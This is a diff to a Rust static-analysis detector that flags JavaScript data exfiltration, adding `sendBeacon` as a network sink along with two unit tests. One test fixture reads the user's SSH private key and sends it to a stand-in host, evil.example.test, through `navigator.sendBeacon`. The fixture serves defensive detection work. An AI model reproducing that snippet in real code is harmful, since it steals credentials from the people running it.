@@ -1517,15 +1517,19 @@ fn is_network_sink(callee: &str, lang: AstLang) -> bool {
     match lang {
         AstLang::JavaScript => {
             // `write` / `send` / `end` are kept from the first increment
-            // (a socket / http.ClientRequest write); `check_exfil_sink`
-            // filters out `console.*` / `process.stdout` receivers so a
-            // local print isn't mistaken for a wire write. Bare `get` is
-            // deliberately NOT here — `map.get` / `params.get` are far too
-            // common; an HTTP GET client shows up via the `axios` / `got`
-            // / `.request` paths instead.
+            // (a socket / http.ClientRequest write, a WebSocket `.send`);
+            // `check_exfil_sink` filters out `console.*` / `process.stdout`
+            // receivers so a local print isn't mistaken for a wire write.
+            // `sendBeacon` is the fire-and-forget exfil primitive — it
+            // takes a URL + a Blob/Buffer/string body and is the usual way
+            // staged data (a `new Blob([secret])`) leaves the page. Bare
+            // `get` is deliberately NOT here — `map.get` / `params.get` are
+            // far too common; an HTTP GET client shows up via the `axios` /
+            // `got` / `.request` paths instead.
             matches!(
                 last,
-                "fetch" | "request" | "write" | "send" | "end" | "post" | "put" | "patch"
+                "fetch" | "request" | "write" | "send" | "sendBeacon" | "end"
+                    | "post" | "put" | "patch"
                     | "lookup" | "resolve" | "resolve4" | "resolveAny" | "query"
             ) || callee.starts_with("axios")
                 || callee.starts_with("got.")
@@ -1718,6 +1722,34 @@ print(DEBUG, LEVEL)
         "#;
         let f = analyze(src, AstLang::JavaScript, Path::new("t"));
         assert!(f.iter().any(|x| x.capability == Capability::ReadCredentials && x.evidence.contains("taint")));
+    }
+
+    #[test]
+    fn taint_through_blob_then_send_beacon() {
+        // A private key staged into a Blob and shipped with sendBeacon —
+        // the fire-and-forget exfil primitive. Both the Blob construction
+        // (descendant-identifier taint) and `sendBeacon` (network sink)
+        // have to line up.
+        let src = r#"
+            const k = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+            const b = new Blob([k], { type: 'text/plain' });
+            navigator.sendBeacon('https://evil.example.test/collect', b);
+        "#;
+        let f = analyze(src, AstLang::JavaScript, Path::new("t"));
+        assert!(
+            f.iter().any(|x| x.capability == Capability::NetworkExternal && x.evidence.contains("taint")),
+            "sendBeacon of a Blob holding an SSH key should be a taint sink: {:?}",
+            f.iter().map(|x| &x.evidence).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn send_beacon_without_a_secret_is_not_flagged() {
+        let src = r#"
+            const payload = JSON.stringify({ event: 'pageview', ts: Date.now() });
+            navigator.sendBeacon('https://analytics.example.com/e', payload);
+        "#;
+        assert!(!has_taint(src, AstLang::JavaScript));
     }
 
     #[test]
